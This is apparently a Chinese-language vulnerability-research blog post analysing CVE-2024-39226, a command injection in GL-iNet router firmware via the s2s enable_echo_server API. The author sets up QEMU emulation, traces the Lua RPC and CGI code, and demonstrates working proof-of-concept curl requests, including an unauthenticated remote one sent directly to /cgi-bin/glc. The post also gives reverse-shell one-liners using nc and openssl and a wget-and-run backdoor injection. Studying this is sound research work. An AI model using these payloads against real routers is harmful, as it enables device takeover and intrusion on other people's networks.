<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>#  CVE-2024-39226 命令注入,CVE-2024-39226 命令注入</title>
    <link rel="stylesheet" href="../../../../assets/css/notes.min.css">
</head>
<body>
    <div id="header-placeholder"></div>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>CVE-2024-39226 命令注入</h1>
<h2>1.漏洞描述</h2>
<p>GL-iNet 产品 AR750/AR750S/AR300M/AR300M16/MT300N-V2/B1300/MT1300/SFT1200/X750 v4.3.11、MT3000/MT2500/AXT1800/AX1800/A1300/X300B v4.5.16、XE300 v4.3.16、E750 v4.3.12、AP1300/S1300 v4.3.13 和 XE3000/X3000 v4.4 被发现存在漏洞，攻击者可以利用该漏洞通过 s2s API 传递恶意 shell 命令来操纵路由器</p>
<p>GL-iNet 是一家专注于智能路由器和网络设备开发的科技公司。成立于 2009 年，总部位于中国，该公司的产品以 OpenWrt 操作系统为基础，提供高度的可定制性和灵活性。GL-iNet 路由器的管理系统是基于 luci-nginx-OpenResty 开发的，核心功能都是 lua 写的</p>
<h2>2.环境搭建</h2>
<p>固件下载：<a href="https://dl.gl-inet.cn/%EF%BC%8C%E4%B8%8B%E8%BD%BD%E7%89%88%E6%9C%AC%EF%BC%9AGL-AX1800">https://dl.gl-inet.cn/，下载版本：GL-AX1800</a> Flint 4.5.16</p>
<p>根据 busybox，可知是 32 位小端 arm 架构</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250220235701753.png" alt="image-20250220235701753"></p>
<p>ARM 架构处理器因为 <strong>低功耗、封装</strong> 限制等种种原因，内部资源宝贵，所以浮点运算单元是十分奢侈的。ARM 体系架构内核中，有些有浮点运算单元（fpu），有些没有。对于没有 fpu 内核，是不能使用 armel 和 armhf 的，有 fpu 的情况下，就可以通过 gcc 的选项-mfloat-abi 来指定使用哪种：</p>
<ul>
<li><strong>soft：</strong> 不用 fpu 计算，即使有 fpu 浮点运算单元也不用。</li>
<li><strong>armel：</strong> 也即 softfp，用 fpu 计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。</li>
<li><strong>armhf：</strong> 也即 hard，用 fpu 计算，传参数用 fpu 中的浮点寄存器传，省去了转换性能最好，但是中断负荷高。</li>
<li>arm64：64 位的 arm 默认就是 hard float 的，因此不需要 hf 的后缀</li>
</ul>
<p>而后面的 EABI，指的是嵌入式 ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。好比 ABI 是计算机上的，EABI 是嵌入式平台上（如 ARM，MIPS 等）</p>
<p>另外还有一个大小端的区别在使用 qemu 时可以发现：</p>
<pre><code>ARMEB = ARM EABI Big-endian ,也有称为ARMBE      #大端字节序
ARMEL = ARM EABI Little-endian,也有称为ARMLE    #小端字节序
</code></pre>
<p>下载 arm 架构的内核镜像和文件系统：<a href="https://people.debian.org/~aurel32/qemu/armhf/">https://people.debian.org/~aurel32/qemu/armhf/</a></p>
<pre><code class="language-shell">wget https://people.debian.org/\~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress #linux 内核镜像文件
wget https://people.debian.org/\~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress #RAM 磁盘映像文件
wget https://people.debian.org/\~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2  #虚拟磁盘映像文件
</code></pre>
<pre><code class="language-shell">chmod +777 -R ./ 
</code></pre>
<p>环境模拟 <a href="http://start.sh">start.sh</a>:</p>
<pre><code class="language-shell">#!/bin/bash

sudo qemu-system-arm \
    -cpu cortex-a15 \
    -M vexpress-a9 \
    -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append &quot;root=/dev/mmcblk0p2&quot; \
    -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic
</code></pre>
<p>网络配置 <a href="http://net.sh">net.sh</a>:</p>
<pre><code class="language-shell">#!/bin/sh
sudo brctl addbr br0                   # 添加一个名为 br0 的网桥
sudo ifconfig br0 192.168.2.3/24 up    # 启用 br0 接口
sudo tunctl -t tap0 -u root            # 创建一个只许 root 访问的 tap0 接口
sudo ifconfig tap0 192.168.2.1/24 up   # 启用 tap0 接口
sudo brctl addif br0 tap0              # 在虚拟网桥中增加一个 tap0 接口
</code></pre>
<p>取消网络配置 unset_net.sh:</p>
<pre><code class="language-shell">#!/bin/sh
sudo ifconfig br0 down # 关闭设备
sudo ifconfig tap0 down # 关闭设备
sudo brctl delbr br0 # 删除网桥
sudo tunctl -d tap0 # 删除网卡
</code></pre>
<p>qemu 网络配置：</p>
<pre><code class="language-shell">ifconfig eth0 192.168.2.2/24 up
ping 192.168.2.1 #测下网
</code></pre>
<p>打包上传：</p>
<pre><code class="language-shell">tar czvf rootfs.tar.gz ./squashfs-root
sudo scp -r rootfs.tar.gz root@192.168.2.2:/root/
tar -xzvf rootfs.tar.gz
</code></pre>
<p>启动：</p>
<pre><code class="language-shell">chmod -R 777 squashfs-root/
cd squashfs-root/
# 挂载文件系统
mount --bind /proc proc
mount --bind /dev dev
chroot . /bin/sh
</code></pre>
<p>要搭建 web 页面的访问，全局搜索一下 index.html, 发现是出现在 nginx.conf 下，所以其 web 服务器猜测应该是 nginx</p>
<p>nginx 启动脚本：/etc/init.d/nginx:</p>
<p>会检查否存在 uhttpd 的初始化脚本（因为 uHTTPd 是 LuCI 默认的 Web 服务器），如果存在，则会停止并禁用其服务，并创建 nginx 服务目录并启动服务</p>
<pre><code class="language-shell">#!/bin/sh /etc/rc.common
# Copyright (C) 2015 OpenWrt.org

START=80

USE_PROCD=1

start_service() {
	[ -f /etc/init.d/uhttpd ] &amp;&amp; {
		/etc/init.d/uhttpd enabled &amp;&amp; {
			/etc/init.d/uhttpd stop
			/etc/init.d/uhttpd disable
		}
	}

	[ -d /var/log/nginx ] || mkdir -p /var/log/nginx
	[ -d /var/lib/nginx ] || mkdir -p /var/lib/nginx

	procd_open_instance
	procd_set_param command /usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
	procd_set_param file /etc/nginx/nginx.conf
	procd_set_param respawn
	procd_close_instance
}
</code></pre>
<p>相关报错修复：（虽然还是有报错，但是服务还是启起来了，并且有 web 界面，其实只要服务能够启起来没有 web 界面也是可以的）</p>
<pre><code class="language-shell">mkdir /var/log
mkdir /var/lib
mkdir /var/run
mkdir /var/log/nginx
mkdir /var/lib/nginx
/etc/init.d/boot boot
/etc/uci-defaults/80_nginx-oui
/usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221162133914.png" alt="image-20250221162133914"></p>
<h2>3.漏洞分析</h2>
<p>首先验证一下 poc，但是会返回 error</p>
<p>curl 常用来请求 Web 服务器，它的名字就是客户端（client）的 URL 工具的意思，curl 的常见用法：</p>
<ul>
<li>get：<code>curl url</code> ， -v 参数可以让我们看到详细的请求信息</li>
<li>post：<code>curl -H header -d body -X 请求协议 url</code>
<ul>
<li>请求协议可能是 POST、GET、DELETE、PUSH、PUT、OPTIONS、HEAD</li>
<li>由于 <code>-d</code> 是 <code>--data</code> 的简写，用于向服务器发送数据，通常与 POST 请求一起使用，所以 poc 中没有写 <code>-X</code></li>
</ul>
</li>
</ul>
<pre><code class="language-shell">curl -H 'glinet: 1' 127.0.0.1/rpc -d '{&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, {&quot;port&quot;: &quot;7 $(touch /root/test)&quot;}]}'
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221162749702.png" alt="image-20250221162749702"></p>
<p>根据访问页面查看一下 rpc 相关信息，可以看到路径 /etc/nginx/conf.d/gl.conf 下有对其路径的处理方法</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221162919662.png" alt="image-20250221162919662"></p>
<p>poc 中的 call 方法对应 oui-rpc.lua 的 rpc_method_call 函数，oui-rpc.lua 中最前面还会验证我们发送的是否 post 请求</p>
<p>rpc_method_call 函数中也有许多判断：</p>
<ul>
<li>params 的长度小于 3，则返回一个错误响应，表示参数无效</li>
<li>检查 sid、object 和 method 是否为字符串类型，以及 args 是否为表类型</li>
<li>如果 object 和 method 需要认证，则检查访问权限。如果没有权限，则返回一个错误响应</li>
<li>调用 rpc.call 方法执行实际的 RPC 调用。如果返回结果是数字类型，则表示发生错误，返回错误响应。如果返回结果不是表类型，则将其设置为空表</li>
<li>最后，将结果封装成响应并返回</li>
</ul>
<pre><code class="language-lua">local rpc = require &quot;oui.rpc&quot;

local function rpc_method_call(id, params)
    if #params &lt; 3 then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    local sid, object, method, args = params[1], params[2], params[3], params[4]

    if type(sid) ~= &quot;string&quot; or type(object) ~= &quot;string&quot; or type(method) ~= &quot;string&quot; then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    if args and type(args) ~= &quot;table&quot; then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_INVALID_PARAMS)
        ngx.say(cjson.encode(resp))
        return
    end

    ngx.ctx.sid = sid

    if not rpc.is_no_auth(object, method) then
        if not rpc.access(&quot;rpc&quot;, object .. &quot;.&quot; .. method) then
            local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)
            ngx.say(cjson.encode(resp))
            return
        end
    end

    local res = rpc.call(object, method, args)
    if type(res) == &quot;number&quot; then
        local resp = rpc.error_response(id, res)
        ngx.say(cjson.encode(resp))
        return
    end

    if type(res) ~= &quot;table&quot; then res = {} end

    local resp = rpc.result_response(id, res)
    ngx.say(cjson.encode(resp))
end
</code></pre>
<p>追踪 usr/lib/lua/oui/rpc.lua 中的 access 函数和 call 函数</p>
<p>在 access 函数中会调用 session 函数，其目的是获取当前会话信息，并且会检查会话是否为本地会话，并且请求头中是否包含 glinet 字段。如果条件满足，直接返回 true，表示允许访问，否则，要是 root 管理员组才能返回 true。所以，这个漏洞目前只能在本地利用。并且在 session 函数中会使用 ubus 进行通信</p>
<pre><code class="language-lua">M.access = function(scope, entry, need)
    local headers = ngx.req.get_headers()
    local s = M.session()
    local aclgroup = s.aclgroup

    if s.is_local and headers[&quot;glinet&quot;] then
        return true
    end

    -- The admin acl group is always allowed
    if aclgroup == &quot;root&quot; then return true end

    if not aclgroup or aclgroup == &quot;&quot; then return false end

    local perm = db.get_perm(aclgroup, scope, entry)

    if not need then return false end

    if need == &quot;r&quot; then
        return perm:find(&quot;[r,w]&quot;) ~= nil
    else
        return perm:find(need) ~= nil
    end
end
</code></pre>
<p>在 call 函数中会调用 glc_call 函数</p>
<pre><code class="language-lua">M.call = function(object, method, args)
    ngx.log(ngx.DEBUG, &quot;call: '&quot;, object, &quot;.&quot;, method, &quot;'&quot;)

    if not objects[object] then
        local script = &quot;/usr/lib/oui-httpd/rpc/&quot; .. object
        if not fs.access(script) then
            return glc_call(object, method, args)
        end

        local ok, tb = pcall(dofile, script)
        if not ok then
            ngx.log(ngx.ERR, tb)
            return glc_call(object, method, args)
        end

        if type(tb) == &quot;table&quot; then
            local funs = {}
            for k, v in pairs(tb) do
                if type(v) == &quot;function&quot; then
                    funs[k] = v
                end
            end
            objects[object] = funs
        end
    end

    local fn = objects[object] and objects[object][method]
    if not fn  then
        return glc_call(object, method, args)
    end

    return fn(args)
end
</code></pre>
<p>在 glc_call 函数中，我们可以看到 ERROR_CODE_INTERNAL_ERROR，并且对应的错误号为-32603，正好于我们上面 poc 验证时出现的报错一致，那么很明显问题出现在 /cgi-bin/glc</p>
<pre><code class="language-lua">local function glc_call(object, method, args)
    ngx.log(ngx.DEBUG, &quot;call C: '&quot;, object, &quot;.&quot;, method, &quot;'&quot;)

    local res = ngx.location.capture(&quot;/cgi-bin/glc&quot;, {
        method = ngx.HTTP_POST,
        body = cjson.encode({
            object = object,
            method = method,
            args = args or {}
        })
    })

    if res.status ~= ngx.HTTP_OK then return M.ERROR_CODE_INTERNAL_ERROR end

    local body = res.body
    local code = tonumber(body:match(&quot;(-?%d+)&quot;))

    if code ~= M.ERROR_CODE_NONE then
        local err_msg = body:match(&quot;%d+ (.+)&quot;)
        if err_msg then
            ngx.log(ngx.ERR, err_msg)
        end
        return code
    end

    local msg = body:match(&quot;%d+ (.*)&quot;)

    return cjson.decode(msg)
end
</code></pre>
<p>在 /cgi-bin/glc 二进制文件中，处理逻辑是：</p>
<ul>
<li>进入 cgi-debug 模式，检查请求方法并存储请求数据，并解析 json 格式的数据</li>
<li>使用 dlopen 加载一个共享库文件，而这个加载的动态库对应漏洞描述和 poc 里的 s2s</li>
<li>使用 dlsym 获取函数指针，并处理执行</li>
</ul>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221194858443.png" alt="image-20250221194858443"></p>
<p>在 <a href="http://s2s.so">s2s.so</a> 中，根据 poc，定位到 enable_echo_server 函数，其中主要启动了一个回显服务器并配置防火墙规则</p>
<ul>
<li>初始化并获取端口号</li>
<li>检查端口号的范围</li>
<li>检查 <code>/usr/bin/echo_server</code> 文件是否存在
<ul>
<li>先杀死现有的 <code>echo_server</code> 进程</li>
<li>然后启动新的 <code>echo_server</code> 进程</li>
</ul>
</li>
<li>初始化 guci，并添加防火墙规则</li>
<li>调用 iptables 命令处理对应规则</li>
</ul>
<p>那么这里的漏洞就很明显了，没有对 port 进行严格的过滤（仅存在一个大小比较）</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221201202182.png" alt="image-20250221201202182"></p>
<h2>4.poc 验证</h2>
<p>由于前面的 poc 验证出现了问题，所以使用 vi 编辑器编辑 etc/nginx/nginx.conf 文件，添加一行 <code>error_log  /tmp/error.log  debug;</code>, 并重启 nginx 服务</p>
<p>发送 poc 后，我们可以看到报错信息，主要是连接到两个 <code>/var/run/ngx-ubus-proxy.sock</code> 和 <code>/var/run/fcgiwrap.socket</code> 失败</p>
<p>补充一下：/var/run 目录中存放的是自系统启动以来描述系统信息的文件，/var/run 使用的是 tmpfs 文件系统，这是一种存储在内存中的临时文件系统，当机器关闭的时候，文件系统自然就被清空了。在目前的 linux 系统中，/var/run 目录，应该指向 run 目录</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221204029940.png" alt="image-20250221204029940"></p>
<p>fcgiwrap: Simple FastCGI wrapper for CGI scripts。NGINX 就是一个只支持 FastCGI，不支持 CGI 的 HTTP（Web）服务器之一。由于 CGI 诞生已经非常久远了，并且它每次在处理一个请求（连接）时都要重新启动脚本（可执行文件），重新传递所有的环境变量（其中非常多是完全一样的），导致性能非常低下。后来出现了性能更高的 FastCGI，FastCGI 性能更高的原因在于，它是常驻内存的，一个 FastCGI 进程可以处理任意多个连接。后来又出现了 Spawn-FCGI，其使得 FastCGI 的进程数可以根据服务器的压力状况动态地创建 FastCGI 进程，这样，可伸缩性就更强了</p>
<pre><code class="language-shell">~ # fcgiwrap -h
Usage: fcgiwrap [OPTION]
Invokes CGI scripts as FCGI.

fcgiwrap version 

Options are:
  -f			Send CGI's stderr over FastCGI
  -c &lt;number&gt;		Number of processes to prefork
  -s &lt;socket_url&gt;	Socket to bind to (say -s help for help)
  -h			Show this help message and exit
  -p &lt;path&gt;		Restrict execution to this script. (repeated options will be merged)

Report bugs to Grzegorz Nosek &lt;&gt;.
fcgiwrap home page: &lt;http://nginx.localdomain.pl/wiki/FcgiWrap&gt;
</code></pre>
<pre><code class="language-shell">mkdir /var/log
mkdir /var/lib
mkdir /var/run
mkdir /var/log/nginx
mkdir /var/lib/nginx
/etc/init.d/boot boot
/etc/uci-defaults/80_nginx-oui &amp;
/sbin/ubusd &amp;
/usr/bin/fcgiwrap -c 4 -s unix:/var/run/fcgiwrap.socket &amp;
/usr/sbin/nginx -c /etc/nginx/nginx.conf -g 'daemon off;'
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221212823635.png" alt="image-20250221212823635"></p>
<p>反弹 shell： mkfifo：创建 FIFO 特殊文件（命名管道）</p>
<p>利用 nc：</p>
<p>靶机：</p>
<pre><code class="language-shell">mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.2.1 6000 &gt; /tmp/f ; rm /tmp/f
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221234001552.png" alt="image-20250221234001552"></p>
<pre><code class="language-shell">mkfifo /tmp/f; /bin/sh -i 2&gt;&amp;1 &lt; /tmp/f | nc 192.168.2.1 6000 &gt; /tmp/f ; rm /tmp/f
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221234235296.png" alt="image-20250221234235296"></p>
<pre><code class="language-shell">mkfifo /tmp/f ; nc 192.168.2.1 6000 &lt; /tmp/f | bash -i  &gt; /tmp/f 2&gt;&amp;1 ; rm /tmp/f
</code></pre>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250221234403674.png" alt="image-20250221234403674"></p>
<p>攻击机：</p>
<pre><code class="language-shell">nc -lvp 6000
</code></pre>
<p>利用 openssl：</p>
<pre><code class="language-shell">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 6000
or ：
ncat --ssl -vv -l -p 6000
</code></pre>
<pre><code class="language-shell">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.2.1:6000 &gt; /tmp/s; rm /tmp/s
</code></pre>
<p>此外，还可以利用木马文件：</p>
<ul>
<li>
<p>metasploit 的 msfvenom 生成一个目标系统架构的 backdoor 文件，功能是反连 shell</p>
</li>
<li>
<p>然后本地 python 起一个 http 服务</p>
<ul>
<li>
<p>服务端：</p>
<pre><code class="language-shell">python -m SimpleHTTPServer，默认监听本地8000端口
</code></pre>
</li>
<li>
<p>客户端：</p>
<pre><code class="language-shell">wget http://ip:8000/xxx
</code></pre>
</li>
</ul>
</li>
<li>
<p>本地监听：</p>
<pre><code class="language-shell">nc -l [port]
</code></pre>
</li>
<li>
<p>命令注入：</p>
<pre><code class="language-shell">;wget backdoor;chmod +x backdoor;./backdoor;
</code></pre>
</li>
</ul>
<h2>5.后续</h2>
<p>官方 poc 只能够在本地实现，blonet 师傅提到其实是可以远程利用的</p>
<p>再补充一点：<em>RPC</em>（Remote Procedure Call）是远程过程调用协议</p>
<p>在 /usr/share/gl-ngx/oui-rpc.lua 中，我们要跳过下面这部分代码：</p>
<ul>
<li>首先考虑 rpc.is_no_auth(object, method)是否能返回 1，这样的话我们就不用管 access 了</li>
<li>其次是 access 的绕过</li>
</ul>
<pre><code class="language-lua">if not rpc.is_no_auth(object, method) then
    if not rpc.access(&quot;rpc&quot;, object .. &quot;.&quot; .. method) then
        local resp = rpc.error_response(id, rpc.ERROR_CODE_ACCESS)
        ngx.say(cjson.encode(resp))
        return
    end
end
</code></pre>
<p>is_no_auth()函数建一个 UCI 游标 c，用于访问 UCI 配置文件，并检查对象和方法是否不需要身份验证</p>
<p>UCI（Unified Configuration Interface，统一配置接口）是 OpenWrt 系统中的一个配置管理系统，用于统一管理各种配置文件。它提供了一种结构化的方式来读取、修改和保存配置文件，使得配置管理更加方便和一致</p>
<p>oui-httpd 中并没有我们要利用的对象和方法，所以不会返回 true，这条路失败了</p>
<pre><code class="language-lua">M.is_no_auth = function(object, method)
    local c = uci.cursor()

    if not no_auth_methods then
        no_auth_methods = {}

        c:foreach(&quot;oui-httpd&quot;, &quot;no-auth-methods&quot;, function(s)
            local ms = {}

            for _, m in ipairs(s.method) do
                ms[m] = true
            end

            no_auth_methods[s.object] = ms
        end)
    end

    if no_auth_methods[object] and no_auth_methods[object][method] then
        return true
    end

    return false
end
</code></pre>
<p>那么下面我们就要确保 rpc.access()调用完后返回的是 true，上面调用函数时传递两个参数：<code>&quot;rpc&quot;</code> 和 <code>object .. &quot;.&quot; .. method</code>。第一个参数 “rpc” 表示访问的范围，第二个参数是通过连接对象名称和方法名称生成的字符串</p>
<p>但是这里其实不是本地的话也是无法绕过的</p>
<pre><code class="language-lua">M.access = function(scope, entry, need)
    local headers = ngx.req.get_headers()
    local s = M.session()
    local aclgroup = s.aclgroup

    if s.is_local and headers[&quot;glinet&quot;] then
        return true
    end

    -- The admin acl group is always allowed
    if aclgroup == &quot;root&quot; then return true end

    if not aclgroup or aclgroup == &quot;&quot; then return false end

    local perm = db.get_perm(aclgroup, scope, entry)

    if not need then return false end

    if need == &quot;r&quot; then
        return perm:find(&quot;[r,w]&quot;) ~= nil
    else
        return perm:find(need) ~= nil
    end
end
</code></pre>
<p>那最终我们还是只能假设我们是本地，然后调用的是 call 函数，最后调用 glc_call，那么我们的想法是，不要前面的 accsss 的检查，而是直接调用 glc_call 函数</p>
<p>给他直接传递 object, method, args 参数就好了，也就对应着原本 poc 的 params 参数中的 2，3，4 参数</p>
<p>补充：CGI-BIN（通用网关接口）是一种特殊的目录，在进行交互式的 WWW 访问</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250224092715068.png" alt="image-20250224092715068"></p>
<pre><code class="language-shell">curl -H 'glinet: 1' 127.0.0.1/rpc -d '{&quot;method&quot;:&quot;call&quot;, &quot;params&quot;:[&quot;&quot;, &quot;s2s&quot;, &quot;enable_echo_server&quot;, {&quot;port&quot;: &quot;7 $(touch /root/test)&quot;}]}'
</code></pre>
<pre><code class="language-lua">local function glc_call(object, method, args)
    ngx.log(ngx.DEBUG, &quot;call C: '&quot;, object, &quot;.&quot;, method, &quot;'&quot;)

    local res = ngx.location.capture(&quot;/cgi-bin/glc&quot;, {
        method = ngx.HTTP_POST,
        body = cjson.encode({
            object = object,
            method = method,
            args = args or {}
        })
    })
</code></pre>
<p>那么对照着规则构造一下 poc：</p>
<pre><code class="language-shell">curl 192.168.2.2/cgi-bin/glc -d '{&quot;object&quot;:&quot;s2s&quot;, &quot;method&quot;:&quot;enable_echo_server&quot;, &quot;args&quot;:{&quot;port&quot;:&quot;7 $(touch /root/test)&quot;}}'
</code></pre>
<p>远程验证成功：</p>
<p><img src="/0101/IOT/Practice/GL-iNet/assets/CVE-2024-39226%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20250224100103412.png" alt="image-20250224100103412"></p>

        </main>
    </div>
    <footer class="footer">
        <p>&copy; 2024 waiwai24. All rights reserved.</p>
    </footer>
    <script src="../../../../assets/js/header.js"></script>
    <script src="../../../../assets/js/include-header.js"></script>
</body>
</html>